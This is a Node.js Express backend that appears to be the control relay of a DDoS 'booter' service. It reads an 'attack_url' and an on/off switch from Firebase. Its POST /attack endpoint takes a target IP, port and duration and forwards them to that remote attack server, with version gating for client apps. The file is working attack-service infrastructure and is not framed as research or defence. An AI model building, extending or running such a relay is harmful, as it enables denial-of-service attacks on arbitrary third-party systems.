require('dotenv').config()

const express = require('express')
const admin = require('firebase-admin')

const app = express()
app.use(express.json())

// ===== ENV VALIDATION =====
if (!process.env.FIREBASE_DB_URL) {
    console.error("❌ FIREBASE_DB_URL missing")
    process.exit(1)
}

if (!process.env.FIREBASE_KEY) {
    console.error("❌ FIREBASE_KEY missing")
    process.exit(1)
}

// ===== FIREBASE INIT =====
let serviceAccount

try {
    serviceAccount = JSON.parse(process.env.FIREBASE_KEY)

    if (!serviceAccount.private_key) {
        throw new Error("private_key missing in FIREBASE_KEY")
    }

    // fix newline
    serviceAccount.private_key =
        serviceAccount.private_key.replace(/\\n/g, '\n')

} catch (e) {
    console.error("❌ FIREBASE_KEY parse error:", e.message)
    process.exit(1)
}

try {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: process.env.FIREBASE_DB_URL
    })
} catch (e) {
    console.error("❌ Firebase init error:", e.message)
    process.exit(1)
}

const db = admin.database()

// ===== CACHE =====
let cachedConfig = null
let lastFetch = 0
const CACHE_TTL = 5000

async function getConfig() {
    const now = Date.now()

    if (cachedConfig && (now - lastFetch) < CACHE_TTL) {
        return cachedConfig
    }

    const snap = await db.ref('config').get()

    if (!snap.exists()) return null

    cachedConfig = snap.val()
    lastFetch = now

    return cachedConfig
}

// ===== CONFIG =====
app.get('/config', async (req, res) => {
    try {
        const config = await getConfig()

        if (!config) {
            return res.status(404).json({ error: "Config not found" })
        }

        if (!config.status) {
            return res.status(403).json({ error: "Service disabled" })
        }

        res.json({
            attack_url: config.attack_url,
            version: config.version || 1
        })

    } catch (err) {
        console.error("CONFIG ERROR:", err)
        res.status(500).json({ error: "Internal error" })
    }
})

// ===== ATTACK =====
app.post('/attack', async (req, res) => {
    const { ip, port, time } = req.body

    if (!ip || !port || !time) {
        return res.status(400).json({ error: "Invalid params" })
    }

    try {
        const config = await getConfig()

        if (!config || !config.status) {
            return res.status(403).json({ error: "Service OFF" })
        }

        // version check
        const clientVersion = Number(req.headers['version'] || 0)
        if (config.version && clientVersion < config.version) {
            return res.status(426).json({ error: "Update required" })
        }

        const response = await fetch(`${config.attack_url}/attack`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip, port, time })
        })

        const data = await response.text()

        res.status(response.status).send(data)

    } catch (err) {
        console.error("ATTACK ERROR:", err)
        res.status(500).json({ error: "Internal error" })
    }
})

// ===== HEALTH =====
app.get('/', (req, res) => {
    res.send("Backend running")
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
    console.log("🚀 Server running on port", PORT)
})